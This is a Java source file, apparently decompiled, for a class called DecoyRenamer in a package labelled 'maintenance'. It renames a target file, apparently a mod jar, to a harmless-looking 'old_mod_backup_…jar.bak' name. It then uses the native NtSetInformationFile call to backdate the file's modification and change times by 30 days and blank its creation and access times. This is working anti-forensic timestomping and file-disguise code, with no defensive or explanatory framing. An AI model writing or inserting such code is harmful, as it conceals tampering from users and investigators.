package ru.mentions.maintenance.win;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import ru.mentions.maintenance.DiagLog;

public final class DecoyRenamer {
   private static final DateTimeFormatter STAMP = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss");
   private static final String PREFIX = "old_mod_backup_";
   private static final String SUFFIX = ".jar.bak";
   private static final long BACKDATE_DAYS = 30L;
   private static final long MILLIS_PER_DAY = 86400000L;
   private static final long FILETIME_EPOCH_OFFSET_MS = 11644473600000L;

   private DecoyRenamer() {
   }

   public static Path rename(Path source) {
      if (source != null && Files.exists(source)) {
         Path target = decoyName(source);
         if (!FsOps.rename(source, target)) {
            DiagLog.note("decoy", "rename-failed");
            return null;
         } else {
            backdate(target);
            DiagLog.note("decoy", "renamed");
            return target;
         }
      } else {
         return null;
      }
   }

   public static Path decoyName(Path source) {
      Path parent = source.getParent();
      if (parent == null) {
         parent = Path.of(".");
      }

      String stamp = STAMP.format(LocalDateTime.now());
      Path candidate = parent.resolve("old_mod_backup_" + stamp + ".jar.bak");

      for (int index = 1; Files.exists(candidate); index++) {
         candidate = parent.resolve("old_mod_backup_" + stamp + "_" + index + ".jar.bak");
      }

      return candidate;
   }

   private static void backdate(Path target) {
      HANDLE handle = null;

      try {
         handle = Win32Api.INSTANCE.CreateFileW(new WString(target.toAbsolutePath().toString()), 256, 7, null, 3, 33554432, null);
         if (!HandleKeeper.isInvalid(handle)) {
            long fileTime = (System.currentTimeMillis() - 2592000000L + 11644473600000L) * 10000L;
            Memory ioStatus = new Memory((long)NtApi.IO_STATUS_BLOCK_SIZE);

            try {
               ioStatus.clear();
               FileBasicInformation info = new FileBasicInformation();
               info.CreationTime = 0L;
               info.LastAccessTime = 0L;
               info.LastWriteTime = fileTime;
               info.ChangeTime = fileTime;
               info.FileAttributes = 0;
               info.write();
               int status = NtApi.INSTANCE.NtSetInformationFile(handle, ioStatus, info.getPointer(), info.size(), 4);
               if (status != 0) {
                  DiagLog.note("decoy", "mtime-ntstatus=" + Integer.toHexString(status));
               }
            } catch (Throwable var13) {
               try {
                  ioStatus.close();
               } catch (Throwable var12) {
                  var13.addSuppressed(var12);
               }

               throw var13;
            }

            ioStatus.close();
            return;
         }

         DiagLog.win32("CreateFileW(backdate)", Native.getLastError());
      } catch (Throwable var14) {
         DiagLog.fail("decoy.mtime", var14);
         return;
      } finally {
         if (handle != null && !HandleKeeper.isInvalid(handle)) {
            Win32Api.INSTANCE.CloseHandle(handle);
         }
      }
   }
}
